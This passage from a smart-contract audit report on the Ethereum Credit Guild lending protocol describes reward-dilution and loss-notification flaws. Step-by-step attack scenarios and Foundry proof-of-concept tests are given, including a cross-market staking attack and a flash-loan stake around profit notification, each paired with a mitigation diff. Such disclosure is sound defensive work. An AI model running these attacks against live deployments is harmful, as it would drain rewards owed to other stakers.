## Findings Summary

| ID | Description | Severity |
| - | - | - |
| [M-01](#m-01-users-can-deflate-other-markets-guild-holders-rewards-by-staking-less-priced-token) | Users can deflate other markets Guild holders rewards by staking less priced token | Medium |
| [M-02](#m-02-wrong-profitmanager-in-guildtoken-will-always-revert-for-other-types-of-gauges-leading-to-bad-debt) | Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt | Medium |
| [M-03](#m-03-malicious-borrower-can-decrease-guild-holders-reward) | Malicious borrower can decrease Guild holders reward | Medium |
| [L-01](#l-01-profitmanagerdonatetotermsurplusbuffer-does-not-check-if-the-term-is-from-the-same-market) | ProfitManager::donateToTermSurplusBuffer() does not check if the term is from the same market | Low |
| [L-02](#l-02-profitmanagernotifypnl-will-revert-in-case-of-loss--_surplusbuffer--termsurplusbuffer) | ProfitManager::NotifyPnL will revert in case of loss == (_surplusBuffer + termSurplusBuffer) | Low |
| [L-03](#l-03-minborrow-must-be-based-on-the-market-token) | MinBorrow must be based on the market token | Low |
| [L-04](#l-04-gusdc-onboarder-can-allow-implementation-of-other-markets-eg-gweth) | gUSDC onboarder can allow implementation of other markets (eg. gWETH) | Low |
| [L-05](#l-05-corerefemergencyaction-is-susceptible-to-returnbomb-attack) | CoreRef::emergencyAction is susceptible to returnbomb attack | Low |
| [L-06](#l-06-if-borrower-become-blacklisted-for-his-collateral-his-loan-need-to-be-forgiven-in-case-to-receive-it) | If borrower become blacklisted for his collateral his loan need to be forgiven in case to receive it | Low |
| [L-07](#l‑07-incrementgauge-can-be-called-with-0-weight) | IncrementGauge can be called with 0 weight | Low |
| [L-08](#l-08-credit-rewards-accrue-for-slashed-users) | Credit rewards accrue for slashed users | Low |
| [L-09](#l-09-hardcoded-block-numbers-will-lead-to-unsuccessful-off-boarding) | Hardcoded block numbers will lead to unsuccessful off-boarding | Low |
| [L-10](#l-10-hardcoded-min_stake-of-1e18-doesnt-incentivize-staking-expensive-tokens) | Hardcoded Min_stake of 1e18 doesn’t incentivize staking expensive tokens | Low |
| [L-11](#l-11-guild-rewards-are-calculated-wrong) | Guild rewards are calculated wrong | Low |

# [M-01] Users can deflate other markets Guild holders rewards by staking less priced token

## Impact

In the `SurplusGuildMinter::stake()` function, there is currently no check to verify if the provided term’s `CREDIT` token is the same as the `CREDIT` token in the called `SurplusGuildMinter`. This oversight could result in inaccuracies in gaugeWeight and rewards for guild holders, especially with the upcoming inclusion of various markets such as gUSDC and likely gWETH.

A potential issue exists where a user can stake in the `SurplusGuildMinter(gUSDC)` using a gWETH term. This action results in the user obtaining Guild tokens based on staked gUSDC but inadvertently increases the gaugeWeight for gWETH. As a consequence, other Guild token holders in the gWETH market may receive reduced rewards. 

With a `guild:credit` mintRatio of 2, a staker should receive 2 Guild tokens for 1 `gWETH`. However, if the staker uses the wrong `SurplusGuildMinter` and stakes 1 gUSDC, again 2 Guild tokens will be minted, creating a situation where the malicious staker can increase the `gWETH` gaugeWeight with cheaper `CreditToken`.

As illustrated in the scenario below, with just $100, the malicious staker can reduce guild holder rewards more than twice. Afterward, they can unstake the initial $100, causing a loss of rewards for other stakers.

> ***NOTE:** The malicious staker won't receive rewards for this stake, and there won't be any penalties (slashing) if the term incurs no losses until they decide to unstake.*
> 

## Proof of Concept

Preconditions:

- `gUSDC` market
- `gWETH` market

Steps:

1. The malicious user mints `gUSDC` using `USDC`.
2. Instead of staking through the appropriate **`SurplusGuildMinter(gWETH)`**, the user stakes in the **`gWETH`** term through **`SurplusGuildMinter(gUSDC)`**. They retain the stake until notifyPnL is called or as desired. Overall, for the lower-priced token (USDC), the user mints a significant amount of Guild compared to the same value in WETH.
3. With just $100, the malicious user can reduce guild holder rewards more than two times.

### Coded PoC

Create a new file in `test/unit/loan` called `StakeIntoWrongTerm.t.sol`

```solidity
pragma solidity 0.8.13;

import {Test, console} from "@forge-std/Test.sol";
import {Core} from "@src/core/Core.sol";
import {CoreRoles} from "@src/core/CoreRoles.sol";
import {GuildToken} from "@src/tokens/GuildToken.sol";
import {CreditToken} from "@src/tokens/CreditToken.sol";
import {ProfitManager} from "@src/governance/ProfitManager.sol";
import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
import {SurplusGuildMinter} from "@src/loan/SurplusGuildMinter.sol";

contract StakeIntoWrongTermUnitTest is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address private EXPLOITER = makeAddr("exploiter");
    address private STAKER1 = makeAddr("staker1");
    address private STAKER2 = makeAddr("staker2");
    address private STAKER3 = makeAddr("staker3");
    address private termUSDC;
    address private termWETH;
    Core private core;
    ProfitManager private profitManagerUSDC;
    ProfitManager private profitManagerWETH;
    CreditToken gUSDC;
    CreditToken gWETH;
    GuildToken guild;
    RateLimitedMinter rlgm;
    SurplusGuildMinter sgmUSDC;
    SurplusGuildMinter sgmWETH;

    // GuildMinter params
    uint256 constant MINT_RATIO = 2e18;
    uint256 constant REWARD_RATIO = 5e18;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManagerUSDC = new ProfitManager(address(core));
        profitManagerWETH = new ProfitManager(address(core));
        gUSDC = new CreditToken(address(core), "gUSDC", "gUSDC");
        gWETH = new CreditToken(address(core), "gWETH", "gWETH");
        guild = new GuildToken(address(core), address(profitManagerWETH));
        rlgm = new RateLimitedMinter(
            address(core), /*_core*/
            address(guild), /*_token*/
            CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
            type(uint256).max, /*_maxRateLimitPerSecond*/
            type(uint128).max, /*_rateLimitPerSecond*/
            type(uint128).max /*_bufferCap*/
        );
        sgmUSDC = new SurplusGuildMinter(
            address(core),
            address(profitManagerUSDC),
            address(gUSDC),
            address(guild),
            address(rlgm),
            MINT_RATIO,
            REWARD_RATIO
        );
        sgmWETH = new SurplusGuildMinter(
            address(core),
            address(profitManagerWETH),
            address(gWETH),
            address(guild),
            address(rlgm),
            MINT_RATIO,
            REWARD_RATIO
        );
        profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));
        profitManagerWETH.initializeReferences(address(gWETH), address(guild), address(0));
        termUSDC = address(new MockLendingTerm(address(core)));
        termWETH = address(new MockLendingTerm(address(core)));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));
        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmWETH));
        core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));
        core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmWETH));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        // add gauge and vote for it
        guild.setMaxGauges(10);
        guild.addGauge(1, termUSDC);
        guild.addGauge(2, termWETH);

        // labels
        vm.label(address(core), "core");
        vm.label(address(profitManagerUSDC), "profitManagerUSDC");
        vm.label(address(profitManagerWETH), "profitManagerWETH");
        vm.label(address(gUSDC), "gUSDC");
        vm.label(address(gWETH), "gWETH");
        vm.label(address(guild), "guild");
        vm.label(address(rlgm), "rlcgm");
        vm.label(address(sgmUSDC), "sgmUSDC");
        vm.label(address(sgmWETH), "sgmWETH");
        vm.label(termUSDC, "termUSDC");
        vm.label(termWETH, "termWETH");
    }

    function testC1() public {
        gWETH.mint(STAKER1, 10e18);
        gWETH.mint(STAKER2, 50e18);
        gWETH.mint(STAKER3, 30e18);

        vm.startPrank(STAKER1);
        gWETH.approve(address(sgmWETH), 10e18);
        sgmWETH.stake(termWETH, 10e18);
        vm.stopPrank();

        vm.startPrank(STAKER2);
        gWETH.approve(address(sgmWETH), 50e18);
        sgmWETH.stake(termWETH, 50e18);
        vm.stopPrank();

        vm.startPrank(STAKER3);
        gWETH.approve(address(sgmWETH), 30e18);
        sgmWETH.stake(termWETH, 30e18);
        vm.stopPrank();
        
        console.log("------------------------BEFORE ATTACK------------------------");
        console.log("Gauge(gWETH) Weight:                   ", guild.getGaugeWeight(termWETH));

    	vm.warp(block.timestamp + 150 days);
        vm.prank(governor);
        profitManagerWETH.setProfitSharingConfig(
            0.05e18, // surplusBufferSplit
            0.9e18, // creditSplit
            0.05e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        gWETH.mint(address(profitManagerWETH), 1e18);
        profitManagerWETH.notifyPnL(termWETH, 1e18);

        sgmWETH.getRewards(STAKER1, termWETH);
        sgmWETH.getRewards(STAKER2, termWETH);
        sgmWETH.getRewards(STAKER3, termWETH);
        console.log("Staker1 reward:                             ", gWETH.balanceOf(address(STAKER1)));
        console.log("Staker2 reward:                            ", gWETH.balanceOf(address(STAKER2)));
        console.log("Staker3 reward:                            ", gWETH.balanceOf(address(STAKER3)));
        console.log("GaugeProfitIndex:                        ", profitManagerWETH.gaugeProfitIndex(termWETH));
    }

    function testC2() public {
        gWETH.mint(STAKER1, 10e18);
        gWETH.mint(STAKER2, 50e18);
        gWETH.mint(STAKER3, 30e18);

        vm.startPrank(STAKER1);
        gWETH.approve(address(sgmWETH), 10e18);
        sgmWETH.stake(termWETH, 10e18);
        vm.stopPrank();

        vm.startPrank(STAKER2);
        gWETH.approve(address(sgmWETH), 50e18);
        sgmWETH.stake(termWETH, 50e18);
        vm.stopPrank();

        vm.startPrank(STAKER3);
        gWETH.approve(address(sgmWETH), 30e18);
        sgmWETH.stake(termWETH, 30e18);
        vm.stopPrank();

        console.log("------------------------AFTER ATTACK-------------------------");
        console.log("Gauge(gWETH) Weight Before Attack:     ", guild.getGaugeWeight(termWETH));

        gUSDC.mint(EXPLOITER, 100e18);
        console.log("EXPLOITER gUSDC balance before stake:  ", gUSDC.balanceOf(EXPLOITER));
        vm.startPrank(EXPLOITER);
        gUSDC.approve(address(sgmUSDC), 100e18);
        sgmUSDC.stake(termWETH, 100e18);
        console.log("EXPLOITER gUSDC balance after stake:                       ", gUSDC.balanceOf(EXPLOITER));
        vm.stopPrank();

        console.log("Gauge(gWETH) Weight After Attack:      ", guild.getGaugeWeight(termWETH));

    	vm.warp(block.timestamp + 150 days);
        vm.prank(governor);
        profitManagerWETH.setProfitSharingConfig(
            0.05e18, // surplusBufferSplit
            0.9e18, // creditSplit
            0.05e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        gWETH.mint(address(profitManagerWETH), 1e18);
        profitManagerWETH.notifyPnL(termWETH, 1e18);

        vm.startPrank(EXPLOITER);
        sgmUSDC.unstake(termWETH, 100e18);
        vm.stopPrank();

        console.log("EXPLOITER gUSDC balance after unstake: ", gUSDC.balanceOf(EXPLOITER));
        sgmWETH.getRewards(EXPLOITER, termWETH);
        sgmUSDC.getRewards(EXPLOITER, termWETH);
        console.log("EXPLOITER reward:                                          ", gWETH.balanceOf(address(EXPLOITER)));

        sgmWETH.getRewards(STAKER1, termWETH);
        sgmWETH.getRewards(STAKER2, termWETH);
        sgmWETH.getRewards(STAKER3, termWETH);
        console.log("Staker1 reward:                             ", gWETH.balanceOf(address(STAKER1)));
        console.log("Staker2 reward:                            ", gWETH.balanceOf(address(STAKER2)));
        console.log("Staker3 reward:                             ", gWETH.balanceOf(address(STAKER3)));
        console.log("GaugeProfitIndex After:                  ", profitManagerWETH.gaugeProfitIndex(termWETH));
    }
}
```

There are tests for both cases – one without the attack and another with the attack scenario.

Run them with:

```solidity
forge test --match-contract "StakeIntoWrongTermUnitTest" -vvv
```

```solidity
Logs:
  ------------------------BEFORE ATTACK------------------------
  Gauge(gWETH) Weight:                    180000000000000000000
  Staker1 reward:                              5555555555555540
  Staker2 reward:                             27777777777777700
  Staker3 reward:                             16666666666666620
  GaugeProfitIndex:                         1000277777777777777

Logs:
  Gauge(gWETH) Weight Before Attack:      180000000000000000000
  EXPLOITER gUSDC balance before stake:   100000000000000000000
  EXPLOITER gUSDC balance after stake:                        0
  Gauge(gWETH) Weight After Attack:       380000000000000000000
  EXPLOITER gUSDC balance after unstake:  100000000000000000000
  EXPLOITER reward:                                           0
  Staker1 reward:                              2631578947368420
  Staker2 reward:                             13157894736842100
  Staker3 reward:                              7894736842105260
  GaugeProfitIndex After:                   1000131578947368421
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

To prevent manipulation, add a check in the **`stake()`** function to ensure that the passed term is from the same market as the SurplusGuildMinter.

```diff
function stake(address term, uint256 amount) external whenNotPaused {
+		require(LendingTerm(term).getReferences().creditToken == credit, "SurplusGuildMinter: term from wrong market!");

    // apply pending rewards
    (uint256 lastGaugeLoss, UserStake memory userStake, ) = getRewards(
        msg.sender,
        term
    );

    require(
        lastGaugeLoss != block.timestamp,
        "SurplusGuildMinter: loss in block"
    );
    require(amount >= MIN_STAKE, "SurplusGuildMinter: min stake");

    // pull CREDIT from user & transfer it to surplus buffer
    CreditToken(credit).transferFrom(msg.sender, address(this), amount);
    CreditToken(credit).approve(address(profitManager), amount);
    ProfitManager(profitManager).donateToTermSurplusBuffer(term, amount);

    // self-mint GUILD tokens
    uint256 _mintRatio = mintRatio;
    uint256 guildAmount = (_mintRatio * amount) / 1e18;
    RateLimitedMinter(rlgm).mint(address(this), guildAmount);
    GuildToken(guild).incrementGauge(term, guildAmount);

    // update state
    userStake = UserStake({
        stakeTime: SafeCastLib.safeCastTo48(block.timestamp),
        lastGaugeLoss: SafeCastLib.safeCastTo48(lastGaugeLoss),
        profitIndex: SafeCastLib.safeCastTo160(
            ProfitManager(profitManager).userGaugeProfitIndex(
                address(this),
                term
            )
        ),
        credit: userStake.credit + SafeCastLib.safeCastTo128(amount),
        guild: userStake.guild + SafeCastLib.safeCastTo128(guildAmount)
    });
    _stakes[msg.sender][term] = userStake;

    // emit event
    emit Stake(block.timestamp, term, amount);
}
```

# [M-02] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

## Impact

In `GuildToken.sol`, there's a mistake where `profitManager` is set in the constructor. This is problematic because different markets have different `ProfitManagers`, and the logic was initially designed for only one market (e.g., `gUSDC`). As a result, calling `notifyPnL()` with negative value (via `forgive()`or `onBid()` in other type of terms(e.g. `gWETH`)), it triggers `GuildToken::notifyGaugeLoss()`. However, this always results in a revert for other term types because the caller is the ProfitManager of that type, whereas `GuildToken::notifyGaugeLoss()` expects the one set in the constructor.

As a result, this means that loans from other markets won't be removed unless users repay them, resulting in bad debt for the protocol.

[GuildToken::notifyGaugeLoss()](https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/tokens/GuildToken.sol#L123-L129)

```solidity
function notifyGaugeLoss(address gauge) external {
    require(msg.sender == profitManager, "UNAUTHORIZED");

    // save gauge loss
    lastGaugeLoss[gauge] = block.timestamp;
    emit GaugeLoss(gauge, block.timestamp);
}
```

> ***NOTE:** It's using this profitManager in other parts of `GuildToken`, but it has nothing to do with the attack, and it doesn't cause any impact. However, we show how to fix it in the recommendation section. Because the profitManager should be removed altogether and always called dynamically based on the passed gauge.*
> 

## Proof of Concept

*Conditions:* 

- 2+ market (`gUSDC`, `gWETH`, …)
- negative `notifyPnL()` (via `forgive()` or `onBid()`)

### Coded PoC

Firstly, you need to add additional variables for other term type and include them in the `setUp()`.

Modify `SurplusGuildMinter.t.sol` as shown.

```diff
contract SurplusGuildMinterUnitTest is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address private term;
+   address private termWETH;
    Core private core;
    ProfitManager private profitManager;
+   ProfitManager private profitManagerWETH;
    CreditToken credit;
+   CreditToken creditWETH;
    GuildToken guild;
    RateLimitedMinter rlgm;
    SurplusGuildMinter sgm;

    // GuildMinter params
    uint256 constant MINT_RATIO = 2e18;
    uint256 constant REWARD_RATIO = 5e18;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManager = new ProfitManager(address(core));
+       profitManagerWETH = new ProfitManager(address(core));
        credit = new CreditToken(address(core), "name", "symbol");
+       creditWETH = new CreditToken(address(core), "WETH", "WETH");
        guild = new GuildToken(address(core), address(profitManager));
        rlgm = new RateLimitedMinter(
            address(core), /*_core*/
            address(guild), /*_token*/
            CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
            type(uint256).max, /*_maxRateLimitPerSecond*/
            type(uint128).max, /*_rateLimitPerSecond*/
            type(uint128).max /*_bufferCap*/
        );
        sgm = new SurplusGuildMinter(
            address(core),
            address(profitManager),
            address(credit),
            address(guild),
            address(rlgm),
            MINT_RATIO,
            REWARD_RATIO
        );
        profitManager.initializeReferences(address(credit), address(guild), address(0));
+       profitManagerWETH.initializeReferences(address(creditWETH), address(guild), address(0));
        term = address(new MockLendingTerm(address(core)));
+       termWETH = address(new MockLendingTerm(address(core)));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgm));
        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmWETH));
        core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgm));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        // add gauge and vote for it
        guild.setMaxGauges(10);
        guild.addGauge(1, term);
        guild.mint(address(this), 50e18);
        guild.incrementGauge(term, uint112(50e18));

+       guild.addGauge(2, termWETH);

        // labels
        vm.label(address(core), "core");
        vm.label(address(profitManager), "profitManager");
        vm.label(address(credit), "credit");
        vm.label(address(guild), "guild");
        vm.label(address(rlgm), "rlcgm");
        vm.label(address(sgm), "sgm");
        vm.label(term, "term");
    }

...
}
```

Place the test in the same `SurplusGuildMinter.t.sol` and run with:

```bash
forge test --match-contract "SurplusGuildMinterUnitTest" --match-test "testNotifyPnLCannotBeCalledWithNegative"
```

```solidity
function testNotifyPnLCannotBeCalledWithNegative() public {
    // Show that for the initial gUSDC term there is no problem.
    credit.mint(address(profitManager), 10);
    profitManager.notifyPnL(term, -1);

    creditWETH.mint(address(profitManagerWETH), 10);
    vm.expectRevert("UNAUTHORIZED");
    profitManagerWETH.notifyPnL(termWETH, -1);
}
```

## Tools Used

Manual Review

## Recommended Mitigation Steps

In the `GuildToken.sol`, `ProfitManager` need to be dynamically called, because there will be different `ProfitManager` for each market. 

Since the caller of the `notifyGaugeLoss()` need to be the profitManager of the passed gauge here is the refactored logic.

```diff
function notifyGaugeLoss(address gauge) external {
+   address gaugeProfitManager = LendingTerm(gauge).getReferences().profitManager;
+   require(msg.sender == gaugeProfitManager, "UNAUTHORIZED");
-		require(msg.sender == profitManager, "UNAUTHORIZED");

    // save gauge loss
    lastGaugeLoss[gauge] = block.timestamp;
    emit GaugeLoss(gauge, block.timestamp);
}
```

You should also rework `_decrementGaugeWeight()` and `_incrementGaugeWeight()` as follows.

```diff
function _decrementGaugeWeight(
    address user,
    address gauge,
    uint256 weight
) internal override {
    uint256 _lastGaugeLoss = lastGaugeLoss[gauge];
    uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][user];
    require(
        _lastGaugeLossApplied >= _lastGaugeLoss,
        "GuildToken: pending loss"
    );

    // update the user profit index and claim rewards
-   ProfitManager(profitManager).claimGaugeRewards(user, gauge);
+		address gaugeProfitManager = LendingTerm(gauge).getReferences().profitManager;
+   ProfitManager(gaugeProfitManager).claimGaugeRewards(user, gauge);

    // check if gauge is currently using its allocated debt ceiling.
    // To decrement gauge weight, guild holders might have to call loans if the debt ceiling is used.
    uint256 issuance = LendingTerm(gauge).issuance();
    if (issuance != 0) {
        uint256 debtCeilingAfterDecrement = LendingTerm(gauge).debtCeiling(-int256(weight));
        require(
            issuance <= debtCeilingAfterDecrement,
            "GuildToken: debt ceiling used"
        );
    }

    super._decrementGaugeWeight(user, gauge, weight);
}
```

```diff
function _incrementGaugeWeight(
    address user,
    address gauge,
    uint256 weight
) internal override {
    uint256 _lastGaugeLoss = lastGaugeLoss[gauge];
    uint256 _lastGaugeLossApplied = lastGaugeLossApplied[gauge][user];
    if (getUserGaugeWeight[user][gauge] == 0) {
        lastGaugeLossApplied[gauge][user] = block.timestamp;
    } else {
        require(
            _lastGaugeLossApplied >= _lastGaugeLoss,
            "GuildToken: pending loss"
        );
    }

-   ProfitManager(profitManager).claimGaugeRewards(user, gauge);
+		address gaugeProfitManager = LendingTerm(gauge).getReferences().profitManager;
+   ProfitManager(gaugeProfitManager).claimGaugeRewards(user, gauge);

    super._incrementGaugeWeight(user, gauge, weight);
}
```

# [M-03] Malicious borrower can decrease Guild holders reward

## Impact

A malicious borrower can reduce all Guild holders’ rewards with a big flashloan, upon full repayment.

Borrower opens a loan with the minimum borrowable amount in term with no mandatory partial repayment. Wait for the loan to accumulate interest, then transfer the funds to an alternative account - EXPLOITER. EXPLOITER takes a flash loan, stakes the amount through `SurplusGuildMinter`, repays the original loan, lowering the rewards for all other GUILD holders by increasing the `_gaugeWeight` with his staked tokens. Afterward, the EXPLOITER unstakes and returns the flashloan. 

The attacker ends up with his collateral, his loan repaid, credit reward and a big percentage of the reward intended for `GUILD` holders since he is the largest staker for this term at the time of the attack. He receives significant credit and guild rewards as a staker, which is incorrect because he was a staker only for that specific transaction.

He only pays the unavoidable interest payment, typically around $4-5, along with gas costs in the scenario described below.

> ***NOTE:*** *The attack can be simplified further by having a substantial amount of tokens and bypassing the flashloan step. By frontrunning the `notifyPnL()` function with a `stake()`, followed by a backrun with an `unstake()`, this way the attacker can instantly accumulate rewards without being a long-term staker like others in the system.*
> 

## Proof of Concept

The exploiter has two accounts:

- **ALICE account:** This is used to borrow a loan, which the exploiter, will later repay to trigger the `notifyPnL()`.
- **EXPLOITER account:** This account is used to obtain a flash loan, then staked the amount into the same term. This action is designed to deflate rewards for other participants in the system.

> ***Prerequisites**: The exploiter requires approximately $10 balance before the attack to cover the loan interest.*
> 

Here are the detailed steps to execute the described attack:

1. Alice borrows 100 gUSDC.
2. Transfers the borrowed gUSDC to the EXPLOITER account.
3. Waits for 150 days to accumulate interest on the loan. (waiting period can also be shorter, for just 10 days the impact will be slightly lower → 4 decimals less removed from the stakers rewards)
4. EXPLOITER obtains a USDC flash loan.
5. Mints gUSDC through `PSM`.
6. Stakes the minted gUSDC into the same term using SurplusGuildMinter.
7. Repays Alice's position, triggering `notifyPnL()`.
8. `notifyPnL()` updates the `_gaugeProfitIndex`, reducing rewards for other Guild holders.
9. EXPLOITER unstakes.
10. Redeems USDC through PSM.
11. Returns the flash loan.

### Coded PoC

Create new file in `test/unit/loan` called `DeflateGuildHoldersRewards.t.sol`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.13;

import {Test, console} from "@forge-std/Test.sol";
import {Core} from "@src/core/Core.sol";
import {CoreRoles} from "@src/core/CoreRoles.sol";
import {GuildToken} from "@src/tokens/GuildToken.sol";
import {CreditToken} from "@src/tokens/CreditToken.sol";
import {ProfitManager} from "@src/governance/ProfitManager.sol";
import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
import {SurplusGuildMinter} from "@src/loan/SurplusGuildMinter.sol";

contract DeflateGuildHoldersRewardsUnitTest is Test {
    address private governor = address(1);
    address private guardian = address(2);
    address private ALICE = makeAddr("alice");
    address private EXPLOITER = makeAddr("exploiter");
    address private STAKER1 = makeAddr("staker1");
    address private STAKER2 = makeAddr("staker2");
    address private STAKER3 = makeAddr("staker3");
    address private termUSDC;
    Core private core;
    ProfitManager private profitManagerUSDC;
    CreditToken gUSDC;
    GuildToken guild;
    RateLimitedMinter rlgm;
    SurplusGuildMinter sgmUSDC;

    // GuildMinter params
    uint256 constant MINT_RATIO = 2e18;
    uint256 constant REWARD_RATIO = 5e18;

    function setUp() public {
        vm.warp(1679067867);
        vm.roll(16848497);
        core = new Core();

        profitManagerUSDC = new ProfitManager(address(core));
        gUSDC = new CreditToken(address(core), "gUSDC", "gUSDC");
        guild = new GuildToken(address(core), address(profitManagerUSDC));
        rlgm = new RateLimitedMinter(
            address(core), /*_core*/
            address(guild), /*_token*/
            CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
            type(uint256).max, /*_maxRateLimitPerSecond*/
            type(uint128).max, /*_rateLimitPerSecond*/
            type(uint128).max /*_bufferCap*/
        );
        sgmUSDC = new SurplusGuildMinter(
            address(core),
            address(profitManagerUSDC),
            address(gUSDC),
            address(guild),
            address(rlgm),
            MINT_RATIO,
            REWARD_RATIO
        );
        profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));
        termUSDC = address(new MockLendingTerm(address(core)));

        // roles
        core.grantRole(CoreRoles.GOVERNOR, governor);
        core.grantRole(CoreRoles.GUARDIAN, guardian);
        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(this));
        core.grantRole(CoreRoles.GAUGE_ADD, address(this));
        core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
        core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
        core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));
        core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));
        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
        core.renounceRole(CoreRoles.GOVERNOR, address(this));

        guild.setMaxGauges(10);
        guild.addGauge(1, termUSDC);

        // labels
        vm.label(address(core), "core");
        vm.label(address(profitManagerUSDC), "profitManagerUSDC");
        vm.label(address(gUSDC), "gUSDC");
        vm.label(address(guild), "guild");
        vm.label(address(rlgm), "rlcgm");
        vm.label(address(sgmUSDC), "sgmUSDC");
        vm.label(termUSDC, "termUSDC");
    }

    function testGuildHoldersRewardsWithoutEXPLOITER() public {
        // 3 users borrow gUSDC and stake them into the gUSDC term
        // In reality there may be more users, but for testing purposes, three are sufficient.
        gUSDC.mint(STAKER1, 200e18);
        gUSDC.mint(STAKER2, 800e18);
        gUSDC.mint(STAKER3, 600e18);

        vm.startPrank(STAKER1);
        gUSDC.approve(address(sgmUSDC), 200e18);
        sgmUSDC.stake(termUSDC, 200e18);
        vm.stopPrank();

        vm.startPrank(STAKER2);
        gUSDC.approve(address(sgmUSDC), 800e18);
        sgmUSDC.stake(termUSDC, 800e18);
        vm.stopPrank();

        vm.startPrank(STAKER3);
        gUSDC.approve(address(sgmUSDC), 600e18);
        sgmUSDC.stake(termUSDC, 600e18);
        vm.stopPrank();

        // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
        uint borrowTime = block.timestamp;
        gUSDC.mint(ALICE, 100e18);

    	vm.warp(block.timestamp + 150 days);
        uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
        vm.prank(governor);
        profitManagerUSDC.setProfitSharingConfig(
            0.05e18, // surplusBufferSplit
            0.9e18, // creditSplit
            0.05e18, // guildSplit
            0, // otherSplit
            address(0) // otherRecipient
        );

        gUSDC.mint(address(profitManagerUSDC), interest);
        profitManagerUSDC.notifyPnL(termUSDC, int256(interest));

        sgmUSDC.getRewards(STAKER1, termUSDC);
        sgmUSDC.getRewards(STAKER2, termUSDC);
        sgmUSDC.getRewards(STAKER3, termUSDC);
        console.log("------------------------------BEFORE ATTACK------------------------------");
        console.log("Staker1 credit reward:                                  ", gUSDC.balanceOf(address(STAKER1)));
        console.log("Staker1 guild reward:                                  ", guild.balanceOf(address(STAKER1)));
        console.log("Staker2 credit reward:                                 ", gUSDC.balanceOf(address(STAKER2)));
        console.log("Staker2 guild reward:                                  ", guild.balanceOf(address(STAKER2)));
        console.log("Staker3 credit reward:                                  ", gUSDC.balanceOf(address(STAKER3)));
        console.log("Staker3 guild reward:                                  ", guild.balanceOf(address(STAKER3)));
        console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
    }

    function testGuildHoldersRewardsAfterEXPLOITER() public {
        gUSDC.mint(STAKER1, 200e18);
        gUSDC.mint(STAKER2, 800e18);
        gUSDC.mint(STAKER3, 600e18);

        vm.startPrank(STAKER1);
        gUSDC.approve(address(sgmUSDC), 200e18);
        sgmUSDC.stake(termUSDC, 200e18);
        vm.stopPrank();

        vm.startPrank(STAKER2);
        gUSDC.approve(address(sgmUSDC), 800e18);
        sgmUSDC.stake(termUSDC, 800e18);
        vm.stopPrank();

        vm.startPrank(STAKER3);
        gUSDC.approve(address(sgmUSDC), 600e18);
        sgmUSDC.stake(termUSDC, 600e18);
        vm.stopPrank();

        // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
        uint borrowTime = block.timestamp;
        gUSDC.mint(ALICE, 100e18);

